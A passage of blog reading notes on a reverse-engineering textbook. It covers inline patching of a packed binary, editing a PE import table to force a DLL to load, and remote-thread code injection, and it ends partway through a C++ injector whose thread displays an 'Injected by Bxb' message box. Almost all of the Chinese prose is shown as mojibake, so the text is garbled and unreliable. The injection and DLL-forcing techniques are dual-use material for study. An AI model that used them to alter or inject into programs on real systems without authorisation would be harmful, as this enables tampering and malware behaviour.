href="#ä»‹ç»-4" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å†…åµŒè¡¥ä¸ï¼šå†…åµŒä»£ç è¡¥ä¸çš„ç®€ç§°ï¼Œå¯¹éš¾ä»¥ä¿®æ”¹æŒ‡å®šä»£ç æ—¶ï¼Œåœ¨ç¨‹åºä¸­æ’å…¥å¹¶è¿è¡Œè¢«ç§°ä¸ºâ€œæ´ç©´ä»£ç â€çš„è¡¥ä¸ä»£ç åå¯¹ç¨‹åºæ‰“è¡¥ä¸çš„æŠ€æœ¯ã€‚</p><h3 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h3><p>é¦–å…ˆå•æ­¥è°ƒå¼ï¼Œå¾ˆå¿«æ¥åˆ°2å¤„è§£å¯†ä»£ç çš„åœ°æ–¹ï¼Œè®°å½•å¥½è§£å¯†ä»£ç åŒºåŸŸï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706201923481.png" alt="image-20200706201923481"></p><p>ç»§ç»­å•æ­¥ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202406843.png" alt="image-20200706202406843"></p><p>ç»§ç»­ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202743840.png" alt="image-20200706202743840"></p><blockquote><p>EDXå¯„å­˜å™¨ä¸º4ä¸ªå­—èŠ‚å¤§å°ï¼Œåƒè¿™æ ·å‘å…¶ä¸­ä¸æ–­åŠ ä¸Š4ä¸ªå­—èŠ‚çš„å€¼ï¼Œå°±ä¼šå‘ç”Ÿæº¢å‡ºã€‚ä¸€èˆ¬çš„æ ¡éªŒå’Œè®¡ç®—ä¸­å¸¸å¸¸å¿½ç•¥è¯¥æº¢å‡ºé—®é¢˜ï¼Œä½¿ç”¨æœ€åä¸€ä¸ªä¿å­˜åœ¨EDXä¸­çš„å€¼ã€‚</p></blockquote><p>ç»§ç»­å•æ­¥æ­¥å…¥ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203316068.png" alt="image-20200706203316068"></p><p>æœ€åè§£å¯†å®Œæˆï¼Œæ¥åˆ°OEPï¼š40121E<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203545470.png" alt="image-20200706203545470"></p><blockquote><p>æ‰“å†…åµŒè¡¥ä¸æ“ä½œï¼šæ‰¾åˆ°å†™å…¥è¡¥ä¸ä»£ç çš„åŒºåŸŸï¼šï¼ˆ1ï¼‰è®¾ç½®åˆ°æ–‡ä»¶ç©ºç™½åŒºåŸŸã€‚ï¼ˆ2ï¼‰æ‰©å±•æœ€åçš„èŠ‚åŒºåè®¾ç½®ã€‚ï¼ˆ3ï¼‰æ·»åŠ æ–°èŠ‚åŒºåè®¾ç½®ã€‚</p></blockquote><p>è¿™é‡Œç›´æ¥æ‰¾ç©ºç™½åŒºåŸŸï¼šåœ¨.txtèŠ‚åŒºçš„ï¼š401280å¼€å§‹å†™å…¥ä»£ç ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706205802855.png" alt="image-20200706205802855"></p><p>æœ€ååœ¨ä¹‹å‰çš„jmp oepçš„åœ°æ–¹ï¼ŒæŠŠoepä¿®æ”¹ä¸ºæˆ‘ä»¬çš„å†…åµŒè¡¥ä¸ã€‚ä½†æ˜¯æ³¨æ„ï¼šjmp oepæŒ‡ä»¤ä¹Ÿæ˜¯åŠ å¯†äº†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†™å…¥å¼‚æˆ–è¿‡çš„æ•°æ®ã€‚ä¸”è¿™é‡Œè¦å†™å…¥æ–‡ä»¶ä¸­æ‰å¯ä»¥ï¼Œä¸èƒ½æ˜¯å†…å­˜ä¸­ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706210952163.png" alt="image-20200706210952163"></p><p>æœ€åï¼Œæ‰“å¼€æ–‡ä»¶æˆåŠŸã€‚</p><hr><h2 id="ç¬¬äºŒåäº”ç« -é€šè¿‡ä¿®æ”¹PEåŠ è½½DLL"><a href="#ç¬¬äºŒåäº”ç« -é€šè¿‡ä¿®æ”¹PEåŠ è½½DLL" class="headerlink" title="ç¬¬äºŒåäº”ç«  é€šè¿‡ä¿®æ”¹PEåŠ è½½DLL"></a>ç¬¬äºŒåäº”ç«  é€šè¿‡ä¿®æ”¹PEåŠ è½½DLL</h2><h3 id="ä»‹ç»-5"><a href="#ä»‹ç»-5" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>é€šè¿‡â€œç›´æ¥ä¿®æ”¹ç›®æ ‡æ–‡ä»¶çš„å¯æ‰§è¡Œæ–‡ä»¶â€ï¼Œä½¿å…¶è¿è¡Œæ—¶å¼ºåˆ¶åŠ è½½æŒ‡å®šçš„DLLæ–‡ä»¶ã€‚æ¯å½“è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶å°±ä¼šè‡ªåŠ¨åŠ è½½æŒ‡å®šçš„DLLæ–‡ä»¶ï¼Œè€Œ<strong>åŠ è½½äº†æŸDLLæ–‡ä»¶ä¼šè‡ªåŠ¨æ‰§è¡Œå…¶DLLMainã€‚</strong></p><p>æœ¬æŠ€æœ¯å…³é”®å°±æ˜¯å¯¹PEæ–‡ä»¶å¤´çš„ä¿®æ”¹ï¼ŒæŠŠä¹‹å‰å­¦ä¹ äº†PEçŸ¥è¯†åº”ç”¨èµ·æ¥ï¼ˆç‰¹åˆ«æ˜¯IMAGE_IMPORT_DESCRIPTOPï¼‰ã€‚</p><h3 id="å®æ“-1"><a href="#å®æ“-1" class="headerlink" title="å®æ“"></a>å®æ“</h3><p>å¯¹äºè¦å¼ºåˆ¶åŠ è½½dllæ–‡ä»¶æºä»£ç å°±æ˜¯ä¸‹è½½ä¸€ä¸ªç½‘é¡µçš„åŠŸèƒ½ï¼Œæœ¬æŠ€æœ¯çš„å…³é”®ä¸åœ¨è¿™é‡Œï¼Œæ‰€ä»¥æˆ‘åªå°†æˆ‘æŸ¥è¿‡å…¶ä¸­çš„ä¸€äº›å‡½æ•°è®°å½•ä¸‹æ¥ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,   <span class="comment">//åº”ç”¨ç¨‹åºæˆ–DLLå®ä¾‹å¥æŸ„,NULLåˆ™ä¸ºè·å–å½“å‰ç¨‹åºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR lpFilename, <span class="comment">//æ¥æ”¶è·¯å¾„çš„å­—ç¬¦ä¸²ç¼“å†²åŒº</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize        <span class="comment">//æ¥æ”¶è·¯å¾„çš„å­—ç¬¦ç¼“å†²åŒºçš„å¤§å°</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>; <span class="comment">//å‡½æ•°è¿”å›å½“å‰è¿›ç¨‹å·²åŠ è½½å¯æ‰§è¡Œæˆ–DLLæ–‡ä»¶çš„å®Œæ•´è·¯å¾„å(ä»¥'\0'ç»ˆæ­¢)</span></span><br><span class="line"></span><br><span class="line">_tcsrchr("å­—ç¬¦ä¸²"ï¼Œ 'è¦æŸ¥æ‰¾çš„å­—ç¬¦')</span><br><span class="line"><span class="comment">//è¿”å›å€¼ï¼šæŒ‡å‘æœ€åä¸€æ¬¡åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„è¯¥å­—ç¬¦çš„æŒ‡é’ˆï¼Œå¦‚æœè¦æŸ¥æ‰¾çš„å­—ç¬¦å†ä¸²ä¸­æ²¡æœ‰å‡ºç°ï¼Œåˆ™è¿”å›NULLã€‚</span></span><br><span class="line"></span><br><span class="line">_tcschr("å­—ç¬¦ä¸²"ï¼Œ 'è¦æŸ¥æ‰¾çš„å­—ç¬¦')</span><br><span class="line"><span class="comment">//è¿”å›å€¼ï¼šæŒ‡å‘ç¬¬ä¸€æ¬¡åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„è¯¥å­—ç¬¦çš„æŒ‡é’ˆï¼Œå¦‚æœè¦æŸ¥æ‰¾çš„å­—ç¬¦å†ä¸²ä¸­æ²¡æœ‰å‡ºç°ï¼Œåˆ™è¿”å›NULLã€‚</span></span><br></pre></td></tr></table></figure><p>ç”±äºPEæ–‡ä»¶ä¸­å¯¼å…¥çš„DLLä¿¡æ¯ä»¥ç»“æ„ä½“åˆ—è¡¨å½¢å¼å­˜å‚¨åœ¨IDTã€‚</p><p>é¦–å…ˆæŸ¥çœ‹IDTçš„æ‰€å ç©ºé—´ï¼Œæ‰¾åˆ°åœ°å€ï¼Œå‘ç°ä»¥NULLç»“å°¾çš„IIDåå­˜åœ¨å…¶ä»–æ•°æ®ã€‚æ‰€ä»¥è¦æ·»åŠ ä¸€ä¸ªIIDçš„è¯ï¼Œæˆ‘ä»¬å°±è¦ç§»åŠ¨IDTåˆ°ä¸€ä¸ªæ–°çš„è¶³å¤Ÿå¤§ç©ºé—´ï¼Œå†åœ¨å…¶å°¾éƒ¨æ·»åŠ ä¸€ä¸ªIIDã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917221854666.png" alt="image-20200917221854666"></p><p>ç¡®å®šç§»åŠ¨ç›®æ ‡ä½ç½®ï¼š(3ç§æ–¹å¼)</p><ol><li>æŸ¥æ‰¾æ–‡ä»¶çš„ç©ºç™½åŒºåŸŸã€‚</li><li>å¢åŠ æ–‡ä»¶æœ€åä¸€ä¸ªèŠ‚åŒºçš„å¤§å°ã€‚</li><li>åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ æ–°èŠ‚åŒºã€‚</li></ol><p>é¦–å…ˆç›´æ¥æŸ¥çœ‹æœ¬èŠ‚åŒºä¸­çš„ç©ºç™½åŒºåŸŸï¼Œå‘ç°æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼Œä½†è¦è®¡ç®—è¯¥åŒºåŸŸä¸­åŠ è½½åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜çš„åŒºåŸŸï¼Œå› ä¸ºåªæœ‰èŠ‚åŒºå¤´æ˜ç¡®è®°å½•çš„åŒºåŸŸæ‰ä¼šè¢«åŠ è½½ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917222618970.png" alt="image-20200917222618970"></p><p>æ‰€ä»¥è¿˜æœ‰æœªè¢«ä½¿ç”¨çš„åŒºåŸŸå¤§å°ä¸ºï¼š1AAï¼Œè¿™æ˜¯è¶³å¤Ÿçš„ã€‚</p><blockquote><p>èŠ‚åŒºåœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„å¤§å°æ¯”åŠ è½½åˆ°å†…å­˜çš„å¤§å°å¤§çš„åŸå› ï¼š</p><p><strong>æ–‡ä»¶çš„å¤§å°æ˜¯ç»è¿‡æ–‡ä»¶å¯¹é½åçš„ã€‚</strong></p></blockquote><p>å¼€å§‹ä¿®æ”¹è¦è®°è½½æŒ‡å®šdllçš„æ–‡ä»¶ï¼š</p><ol><li><p>ä¿®æ”¹å¯¼å…¥è¡¨çš„RVAå€¼åŠå¤§å°ã€‚ï¼ˆæ–°ç§»åŠ¨çš„åŒºåŸŸï¼‰</p></li><li><p>åˆ é™¤ç»‘å®šå¯¼å…¥è¡¨ã€‚ï¼ˆå¯æœ‰å¯æ— ï¼Œæé«˜DLLåŠ è½½é€Ÿåº¦çš„æŠ€æœ¯ï¼‰</p><p><img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200917223157443.png" alt="image-20200917223157443"></p></li><li><p>åˆ›å»ºæ–°çš„IDTï¼Œå°†åŸIDTå¤åˆ¶åˆ°æ–°åŒºåŸŸå¹¶åœ¨å°¾å·´æ·»åŠ æ–°çš„IIDã€‚</p></li><li><p>è®¾ç½®Nameï¼ŒINTï¼ŒIATã€‚ï¼ˆPEå­¦ä¹ å·²ç»è¯¦ç»†è®°å½•äº†ï¼Œè¿™é‡Œå°±å°±åªæ˜¯å®æ“äº†ä¸‹ï¼‰ã€‚</p></li><li><p>ä¿®æ”¹IATèŠ‚åŒºçš„å±æ€§å€¼ï¼Œå¢åŠ å¯å†™å±æ€§ã€‚<strong>IMAGE_SCN_MEM_WRITE(80000000)</strong>ã€‚<strong>æ‰€ä»¥ä»40000040 -&gt; C0000040ã€‚</strong></p></li></ol><p><strong>æœ€åæœ¬ç« ä¸»è¦æ˜¯è¿˜æ˜¯å¯¹PEæ–‡ä»¶ç†Ÿæ‚‰äº†ä¸‹ã€‚</strong></p><hr><h2 id="ç¬¬äºŒåä¸ƒç« -ä»£ç æ³¨å…¥"><a href="#ç¬¬äºŒåä¸ƒç« -ä»£ç æ³¨å…¥" class="headerlink" title="ç¬¬äºŒåä¸ƒç«  ä»£ç æ³¨å…¥"></a>ç¬¬äºŒåä¸ƒç«  ä»£ç æ³¨å…¥</h2><p>ä¹‹å‰å­¦ä¹ äº†DLLæ³¨å…¥ï¼Œè€Œä»£ç æ³¨å…¥ä¸ä¹‹æœ€å¤§çš„åŒºåˆ«å°±æ˜¯åªå‘ç›®æ ‡è¿›ç¨‹æ³¨å…¥è¦è¿è¡Œçš„ä»£ç ä¸æ•°æ®ï¼Œæ³¨å…¥å®Œæˆåä¹‹åæ¶ˆå¤±ã€‚åŸç†ç±»ä¼¼ã€‚</p><p>ä½¿ç”¨dllæ³¨å…¥ä¼˜ç‚¹ï¼š1.å ç”¨å†…å­˜å°‘ã€‚2.éš¾ä»¥æŸ¥æ‰¾ç—•è¿¹ã€‚3.ä¸éœ€è¦å¦å¤–çš„dllæ–‡ä»¶ï¼Œåªè¦æœ‰ä»£ç æ³¨å…¥ç¨‹åºå³å¯ã€‚</p><p><strong>æ•´ä¸ªæµç¨‹ï¼š</strong></p><ul><li><p>æ”¹å˜è¿›ç¨‹çš„æƒé™è¿›è¡Œæå–ã€‚</p></li><li><p>ä»£ç æ³¨å…¥ï¼š</p><ol><li>ä½¿ç”¨GetModuleHandleA()å‡½æ•°è·å¾—æŒ‡å®šæ¨¡å—ï¼ˆkernel.dllï¼‰çš„å¥æŸ„ï¼Œä¸ºäº†è·å¾—è¦ç”¨å‡½æ•°çš„åœ°å€ã€‚</li><li>ä½¿ç”¨OpenProcess()å‡½æ•°è·å¾—æŒ‡å®šPIDå·çš„è¿›ç¨‹çš„å¥æŸ„ã€‚</li><li>è®¾ç½®THREAD_PARAMç»“æ„ä½“å˜é‡å¹¶å¯¹å…¶èµ‹å€¼ï¼ˆ<strong>æ‰€è¦ä½¿ç”¨çš„å‡½æ•°åœ°å€ï¼Œå­—ç¬¦ä¸²</strong>ï¼‰ï¼Œåœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜ï¼Œå°†è¯¥ç»“æ„ä½“å†™å…¥ç›®æ ‡è¿›ç¨‹ã€‚</li><li>è®¡ç®—å‡ºçº¿ç¨‹å‡½æ•°çš„å¤§å°ï¼Œåœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜ï¼Œå°†çº¿ç¨‹å‡½æ•°çš„ä»£ç å†™å…¥ç›®æ ‡è¿›ç¨‹ã€‚</li><li>ä½¿ç”¨CreateRemoteThread()å‡½æ•°åœ¨ç›®æ ‡è¿›ç¨‹åˆ›å»ºä¸€ä¸ªè¿œç¨‹çº¿ç¨‹ï¼ˆ<strong>åˆ©ç”¨å·²ç»å†™å…¥ç›®æ ‡è¿›ç¨‹å†…å­˜çš„æ•°æ®</strong>ï¼‰ã€‚</li></ol></li></ul><blockquote><p>tips:</p><p>Window OSä¸­ï¼ŒåŠ è½½åˆ°è¿›ç¨‹çš„kernel32.dllçš„åœ°å€éƒ½ç›¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ³¨å…¥ç¨‹åºä¸­è·å¾—çš„API(â€œLoadLibraryAâ€ï¼Œâ€œGetProcAddressâ€)çš„åœ°å€ä¸ç›®æ ‡ç¨‹åºè¿›ç¨‹ä¸­è·å–çš„åŒç„¶çš„APIçš„åœ°å€æ˜¯ç›¸åŒçš„ã€‚å› æ­¤å¯ä»¥ç›´æ¥åœ¨æ³¨å…¥ç¨‹åºä¸­è·å¾—å‡½æ•°çš„åœ°å€ã€‚</p></blockquote><p>å…¶å®æ•´ä¸ªæµç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œä½†ç†Ÿç»ƒï¼Œç”¨çš„å¥½è¿˜æ˜¯è¦å¤šå®æˆ˜ç»å†ã€‚</p><p>å®Œæ•´ä»£ç ï¼šï¼ˆæ³¨é‡Šå¯ä»¥çœ‹çš„å¾ˆæ¸…æ¥šï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef int (FAR WINAPI *FARPROC)(); å¯ä»¥åœ¨ç¼–è¯‘å™¨ä¸­æŸ¥çœ‹åˆ°ã€‚</span></span><br><span class="line"><span class="comment">//typedef _Null_terminated_ CONST CHAR *LPCSTR, *PCSTR;</span></span><br><span class="line"><span class="comment">//#define WINAPI      __stdcall</span></span><br><span class="line"><span class="comment">//typedef void far            *LPVOID;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//å‡½æ•°æŒ‡é’ˆæ•°ç»„</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()</span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"</span></span><br><span class="line">&#125; THREAD_PARAM, * PTHREAD_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibraryA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* PFLOADLIBRARYA)</span> <span class="comment">//å¯¹å‡½æ•°å®šä¹‰ä¸€ä¸ªåˆ«åï¼Œä¸‹é¢åŒã€‚</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetProcAddress()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* PFGETPROCADDRESS)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MessageBoxA()</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* PFMESSAGEBOXA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA"</span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"Injected by Bxb"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span 